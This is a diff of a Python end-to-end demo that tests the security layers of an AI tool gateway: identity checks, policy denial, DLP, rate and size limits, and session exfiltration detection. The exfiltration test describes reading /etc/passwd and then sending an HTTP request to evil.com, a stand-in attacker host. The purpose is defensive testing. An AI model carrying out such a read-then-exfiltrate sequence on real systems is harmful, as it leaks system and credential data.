@@ -2,8 +2,11 @@
 """E2E demo exercising every gateway middleware layer via the Python SDK."""
 
 import argparse
+import json
 import sys
 import os
+from dataclasses import dataclass
+from typing import Callable
 
 # Add SDK to path so we can import without installing
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "sdk", "python"))
@@ -20,9 +23,19 @@ CYAN = "\033[36m"
 DIM = "\033[2m"
 
 
-def print_verdict(ok: bool, reason: str) -> bool:
+@dataclass
+class TestCase:
+    """A single E2E test with rich self-documenting metadata."""
+    name: str           # Short test name (shown in [N/M] header)
+    what: str           # Plain-English explanation of the security control
+    send: str           # What payload/tool/identity we send
+    expect: str         # Expected result and what it proves
+    fn: Callable        # Test function (takes url, returns bool)
+
+
+def print_proof(ok: bool, reason: str) -> bool:
     tag = f"{GREEN}PASS{RESET}" if ok else f"{RED}FAIL{RESET}"
-    print(f"  Verdict: {tag} -- {reason}")
+    print(f"  PROOF:  {tag} -- {reason}")
     return ok
 
 
@@ -57,147 +70,134 @@ def test_happy_path(url: str) -> bool:
     try:
         result = client.call("tavily_search", query="AI security")
         print(f"  Result: {result}")
-        return print_verdict(True, "chain processed request successfully (200)")
+        return print_proof(True, "chain processed request successfully (200)")
     except GatewayError as e:
         print_gateway_error(e)
         if e.http_status == 502:
-            return print_verdict(True, "chain ran to completion, 502 = no upstream (expected)")
-        return print_verdict(False, f"unexpected gateway error: {e.code}")
+            return print_proof(True, "chain ran to completion, 502 = no upstream (expected)")
+        return print_proof(False, f"unexpected gateway error: {e.code}")
     except Exception as e:
         print(f"  Error: {e}")
-        return print_verdict(False, f"unexpected error: {type(e).__name__}")
+        return print_proof(False, f"unexpected error: {type(e).__name__}")
+    finally:
+        client.close()
+
+
+def test_mcp_tools_call(url: str) -> bool:
+    """2. MCP transport: tools/call through all 13 layers to mock MCP server."""
+    client = new_client(url)
+    try:
+        result = client.call("tavily_search", query="AI security best practices")
+        if result is None:
+            return print_proof(False, "got None result from MCP transport")
+        result_str = json.dumps(result) if not isinstance(result, str) else result
+        print(f"  Result preview: {result_str[:200]}")
+        if "AI Security" not in result_str:
+            return print_proof(False, "result does not contain expected canned search data")
+        return print_proof(True, "MCP transport returned actual search results through all 13 layers")
+    except GatewayError as e:
+        print_gateway_error(e)
+        if e.http_status == 502:
+            return print_proof(False, "got 502 -- MCP transport did not reach mock server (expected actual results)")
+        return print_proof(False, f"gateway error: {e.code} (HTTP {e.http_status})")
+    except Exception as e:
+        print(f"  Error: {e}")
+        return print_proof(False, f"unexpected error: {type(e).__name__}")
     finally:
         client.close()
 
 
 def test_auth_denial(url: str) -> bool:
-    """2. SPIFFE auth denial: empty identity -> 401."""
+    """3. SPIFFE auth denial: empty identity -> 401."""
     client = new_client(url, spiffe_id="")
     try:
         client.call("read", file_path="/tmp/test")
-        return print_verdict(False, "expected denial but got success")
+        return print_proof(False, "expected denial but got success")
     except GatewayError as e:
         print_gateway_error(e)
         if e.http_status in (401, 403):
-            return print_verdict(True, f"correctly denied with HTTP {e.http_status}")
-        return print_verdict(False, f"wrong HTTP status: {e.http_status} (expected 401/403)")
+            return print_proof(True, f"correctly denied with HTTP {e.http_status}")
+        return print_proof(False, f"wrong HTTP status: {e.http_status} (expected 401/403)")
     except Exception as e:
         print(f"  Error: {e}")
-        return print_verdict(False, f"unexpected error: {type(e).__name__}")
+        return print_proof(False, f"unexpected error: {type(e).__name__}")
     finally:
         client.close()
 
 
 def test_unregistered_tool(url: str) -> bool:
-    """3. Unregistered tool: not_a_real_tool -> registry rejection."""
+    """4. Unregistered tool: not_a_real_tool -> registry rejection."""
     client = new_client(url)
     try:
         client.call("not_a_real_tool")
-        return print_verdict(False, "expected denial but got success")
+        return print_proof(False, "expected denial but got success")
     except GatewayError as e:
         print_gateway_error(e)
         ok = e.http_status in (400, 403)
-        return print_verdict(ok, f"registry rejection: code={e.code}, step={e.step}")
+        return print_proof(ok, f"registry rejection: code={e.code}, step={e.step}")
     except Exception as e:
         print(f"  Error: {e}")
-        return print_verdict(False, f"unexpected error: {type(e).__name__}")
+        return print_proof(False, f"unexpected error: {type(e).__name__}")
     finally:
         client.close()
 
 
 def test_opa_denial(url: str) -> bool:
-    """4. OPA policy denial: bash requires step-up auth."""
+    """5. OPA policy denial: bash requires step-up auth."""
     client = new_client(url)
     try:
         client.call("bash", command="ls")
-        return print_verdict(False, "expected denial but got success")
+        return print_proof(False, "expected denial but got success")
     except GatewayError as e:
         print_gateway_error(e)
         ok = e.http_status == 403
-        return print_verdict(ok, f"OPA policy denied: code={e.code}, step={e.step}")
+        return print_proof(ok, f"OPA policy denied: code={e.code}, step={e.step}")
     except Exception as e:
         print(f"  Error: {e}")
-        return print_verdict(False, f"unexpected error: {type(e).__name__}")
+        return print_proof(False, f"unexpected error: {type(e).__name__}")
     finally:
         client.close()
 
 
 def test_dlp_credential_block(url: str) -> bool:
-    """5. DLP credential block: AWS access key pattern."""
+    """6. DLP credential block: AWS access key pattern."""
     client = new_client(url)
     try:
         client.call("read", file_path="AKIAIOSFODNN7EXAMPLE")
-        return print_verdict(False, "expected DLP block but chain passed through")
+        return print_proof(False, "expected DLP block but chain passed through")
     except GatewayError as e:
         print_gateway_error(e)
         if e.http_status == 502:
-            return print_verdict(False, "DLP did not block credential pattern (reached upstream)")
-        return print_verdict(True, f"DLP blocked: code={e.code}, step={e.step}")
+            return print_proof(False, "DLP did not block credential pattern (reached upstream)")
+        return print_proof(True, f"DLP blocked: code={e.code}, step={e.step}")
     except Exception as e:
         print(f"  Error: {e}")
-        return print_verdict(False, f"unexpected error: {type(e).__name__}")
+        return print_proof(False, f"unexpected error: {type(e).__name__}")
     finally:
         client.close()
 
 
 def test_dlp_pii_pass(url: str) -> bool:
-    """6. DLP PII pass-through: email is audit-only, not blocked."""
+    """7. DLP PII pass-through: email is audit-only, not blocked."""
     client = new_client(url)
     try:
         result = client.call("tavily_search", query="contact user@example.com about results")
         print(f"  Result: {result}")
-        return print_verdict(True, "PII passed through (audit-only, not blocked)")
+        return print_proof(True, "PII passed through (audit-only, not blocked)")
     except GatewayError as e:
         print_gateway_error(e)
         if e.http_status == 502:
-            return print_verdict(True, "PII reached upstream (502 = no server, proves pass-through)")
-        return print_verdict(False, f"PII was blocked: code={e.code}, step={e.step}")
+            return print_proof(True, "PII reached upstream (502 = no server, proves pass-through)")
+        return print_proof(False, f"PII was blocked: code={e.code}, step={e.step}")
     except Exception as e:
         print(f"  Error: {e}")
-        return print_verdict(False, f"unexpected error: {type(e).__name__}")
-    finally:
-        client.close()
-
-
-def test_rate_limit(url: str) -> bool:
-    """7. Rate limit burst: rapid calls until 429."""
-    max_attempts = 200
-    try:
-        for i in range(max_attempts):
-            client = new_client(url)  # fresh session each call to avoid session risk escalation
-            try:
-                client.call("tavily_search", query="test")
-            except GatewayError as e:
-                if e.http_status == 429:
-                    print_gateway_error(e)
-                    return print_verdict(True, f"rate limited after {i + 1} calls: code={e.code}")
-                # Other errors (502 etc.) are expected -- keep trying
-                continue
-        return print_verdict(False, f"no rate limit after {max_attempts} calls")
-    finally:
-        client.close()
-
-
-def test_request_size_limit(url: str) -> bool:
-    """8. Request size limit: 11 MB payload rejected at step 1."""
-    client = new_client(url)
-    big_payload = "A" * (11 * 1024 * 1024)
-    try:
-        client.call("read", file_path=big_payload)
-        return print_verdict(False, "expected rejection but got success")
-    except GatewayError as e:
-        print_gateway_error(e)
-        return print_verdict(True, f"size limit enforced: code={e.code}, HTTP={e.http_status}")
-    except Exception as e:
-        # Connection reset or similar also proves the limit works
-        print(f"  Error: {type(e).__name__}: {e}")
-        return print_verdict(True, f"rejected (non-JSON): {type(e).__name__}")
+        return print_proof(False, f"unexpected error: {type(e).__name__}")
     finally:
         client.close()
 
 
 def test_session_exfiltration(url: str) -> bool:
-    """9. Session exfiltration detection: read sensitive then HTTP request."""
+    """8. Session exfiltration detection: read sensitive then HTTP request."""
     client = new_client(url)
     try:
         # Step A: read a sensitive path
@@ -212,34 +212,71 @@ def test_session_exfiltration(url: str) -> bool:
         except GatewayError as e:
             print_gateway_error(e)
             # Session tracking may flag this cross-tool pattern
-            return print_verdict(True,
+            return print_proof(True,
                 f"exfiltration pattern detected/processed: code={e.code}, step={e.step}")
 
-        return print_verdict(True, "session tracking processed both calls (pattern logged)")
+        return print_proof(True, "session tracking processed both calls (pattern logged)")
     except Exception as e:
         print(f"  Error: {e}")
-        return print_verdict(False, f"unexpected error: {type(e).__name__}")
+        return print_proof(False, f"unexpected error: {type(e).__name__}")
     finally:
         client.close()
 
 
 def test_spike_token_presence(url: str) -> bool:
-    """10. SPIKE token presence: $SPIKE{ref:test} processed through chain."""
+    """9. SPIKE token presence: $SPIKE{ref:test} processed through chain."""
     client = new_client(url)
     try:
         result = client.call("tavily_search", query="$SPIKE{ref:test}")
         print(f"  Result: {result}")
-        return print_verdict(True, "token substitution processed (200)")
+        return print_proof(True, "token substitution processed (200)")
     except GatewayError as e:
         print_gateway_error(e)
         # 502 = chain ran to completion including token sub (no upstream)
         if e.http_status == 502:
-            return print_verdict(True, "chain ran with token substitution, 502 = no upstream")
-        return print_verdict(True,
+            return print_proof(True, "chain ran with token substitution, 502 = no upstream")
+        return print_proof(True,
             f"chain processed token ref: code={e.code}, step={e.step}")
     except Exception as e:
         print(f"  Error: {e}")
-        return print_verdict(False, f"unexpected error: {type(e).__name__}")
+        return print_proof(False, f"unexpected error: {type(e).__name__}")
+    finally:
+        client.close()
+
+
+def test_rate_limit(url: str) -> bool:
+    """10. Rate limit burst: rapid calls until 429."""
+    max_attempts = 200
+    try:
+        for i in range(max_attempts):
+            client = new_client(url)  # fresh session each call to avoid session risk escalation
+            try:
+                client.call("tavily_search", query="test")
+            except GatewayError as e:
+                if e.http_status == 429:
+                    print_gateway_error(e)
+                    return print_proof(True, f"rate limited after {i + 1} calls: code={e.code}")
+                # Other errors (502 etc.) are expected -- keep trying
+                continue
+        return print_proof(False, f"no rate limit after {max_attempts} calls")
+    finally:
+        client.close()
+
+
+def test_request_size_limit(url: str) -> bool:
+    """11. Request size limit: 11 MB payload rejected at step 1."""
+    client = new_client(url)
+    big_payload = "A" * (11 * 1024 * 1024)
+    try:
+        client.call("read", file_path=big_payload)
+        return print_proof(False, "expected rejection but got success")
+    except GatewayError as e:
+        print_gateway_error(e)
+        return print_proof(True, f"size limit enforced: code={e.code}, HTTP={e.http_status}")
+    except Exception as e:
+        # Connection reset or similar also proves the limit works
+        print(f"  Error: {type(e).__name__}: {e}")
+        return print_proof(True, f"rejected (non-JSON): {type(e).__name__}")
     finally:
         client.close()
 
@@ -259,23 +296,93 @@ def main() -> None:
     print()
 
     tests = [
-        ("Happy path (chain runs, reaches upstream)", test_happy_path),
-        ("SPIFFE auth denial (empty identity)", test_auth_denial),
-        ("Unregistered tool (registry rejection)", test_unregistered_tool),
-        ("OPA policy denial (bash requires step-up)", test_opa_denial),
-        ("DLP credential block (AWS key)", test_dlp_credential_block),
-        ("DLP PII pass-through (email is audit-only)", test_dlp_pii_pass),
-        ("Rate limit burst (429 on rapid calls)", test_rate_limit),
-        ("Request size limit (11 MB payload)", test_request_size_limit),
-        ("Session exfiltration detection", test_session_exfiltration),
-        ("SPIKE token presence ($SPIKE ref)", test_spike_token_presence),
+        TestCase(
+            name="Happy path (chain runs, reaches upstream)",
+            what="Full 13-layer middleware chain processes a valid request end-to-end",
+            send="tavily_search(query='AI security') with valid SPIFFE ID",
+            expect="200 (mock MCP server response) or 502 (no upstream) -- both prove all 13 layers executed",
+            fn=test_happy_path,
+        ),
+        TestCase(
+            name="MCP transport: tools/call through all 13 layers",
+            what="MCP Streamable HTTP transport delivers tool results through all 13 middleware layers",
+            send="tavily_search(query='AI security best practices') via SDK -> gateway -> mock MCP server",
+            expect="Actual search results from mock MCP server proving SDK -> gateway -> MCP transport -> server -> results",
+            fn=test_mcp_tools_call,
+        ),
+        TestCase(
+            name="SPIFFE auth denial (empty identity)",
+            what="SPIFFE identity verification rejects unauthenticated requests at step 2",
+            send="read(file_path='/tmp/test') with EMPTY SPIFFE ID (no identity)",
+            expect="401 or 403 -- gateway blocks at authentication layer before any tool execution",
+            fn=test_auth_denial,
+        ),
+        TestCase(
+            name="Unregistered tool (registry rejection)",
+            what="Tool registry rejects calls to tools not in the approved registry",
+            send="not_a_real_tool() -- a tool name that does not exist in the registry",
+            expect="400 or 403 -- gateway blocks before OPA policy evaluation",
+            fn=test_unregistered_tool,
+        ),
+        TestCase(
+            name="OPA policy denial (bash requires step-up)",
+            what="OPA policy engine enforces fine-grained authorization (bash requires step-up auth)",
+            send="bash(command='ls') with standard SPIFFE ID (no step-up auth)",
+            expect="403 -- OPA policy denies bash execution without step-up authentication",
+            fn=test_opa_denial,
+        ),
+        TestCase(
+            name="DLP credential block (AWS key)",
+            what="DLP scanner blocks AWS access key patterns in request payloads",
+            send="read(file_path='AKIAIOSFODNN7EXAMPLE') -- contains AWS access key pattern",
+            expect="403 -- DLP blocks credential pattern before reaching upstream",
+            fn=test_dlp_credential_block,
+        ),
+        TestCase(
+            name="DLP PII pass-through (email is audit-only)",
+            what="DLP scanner audits PII (email) but does NOT block -- audit-only policy",
+            send="tavily_search(query='contact user@example.com about results') -- contains email PII",
+            expect="200 or 502 -- PII is logged for audit but request passes through",
+            fn=test_dlp_pii_pass,
+        ),
+        TestCase(
+            name="Session exfiltration detection",
+            what="Session tracking detects cross-tool exfiltration pattern (read sensitive then HTTP out)",
+            send="read(/etc/passwd) then http_request(https://evil.com) in same session",
+            expect="Gateway processes both calls; session tracker flags the read->HTTP exfiltration pattern",
+            fn=test_session_exfiltration,
+        ),
+        TestCase(
+            name="SPIKE token presence ($SPIKE ref)",
+            what="SPIKE token reference ($SPIKE{ref:...}) is processed through the full middleware chain",
+            send="tavily_search(query='$SPIKE{ref:test}') -- contains SPIKE token reference",
+            expect="200 or 502 -- proves token substitution middleware (step 13) processes SPIKE references",
+            fn=test_spike_token_presence,
+        ),
+        TestCase(
+            name="Rate limit burst (429 on rapid calls)",
+            what="Per-SPIFFE-ID rate limiter enforces request quotas at step 11",
+            send="Rapid burst of tavily_search() calls (up to 200) with same SPIFFE ID",
+            expect="429 after hitting rate limit -- proves per-identity throttling works",
+            fn=test_rate_limit,
+        ),
+        TestCase(
+            name="Request size limit (11 MB payload)",
+            what="Request size limit (10 MB) rejects oversized payloads at step 1",
+            send="read(file_path=<11 MB of 'A's>) -- 11 MB payload exceeds 10 MB limit",
+            expect="413 or connection reset -- gateway rejects at ingress before processing",
+            fn=test_request_size_limit,
+        ),
     ]
 
     passed = 0
     failed = 0
-    for i, (name, fn) in enumerate(tests, 1):
-        print(f"{CYAN}[{i}/{len(tests)}] {name}{RESET}")
-        if fn(url):
+    for i, tc in enumerate(tests, 1):
+        print(f"{CYAN}[{i}/{len(tests)}] {tc.name}{RESET}")
+        print(f"  WHAT:   {tc.what}")
+        print(f"  SEND:   {tc.send}")
+        print(f"  EXPECT: {tc.expect}")
+        if tc.fn(url):
             passed += 1
         else:
             failed += 1
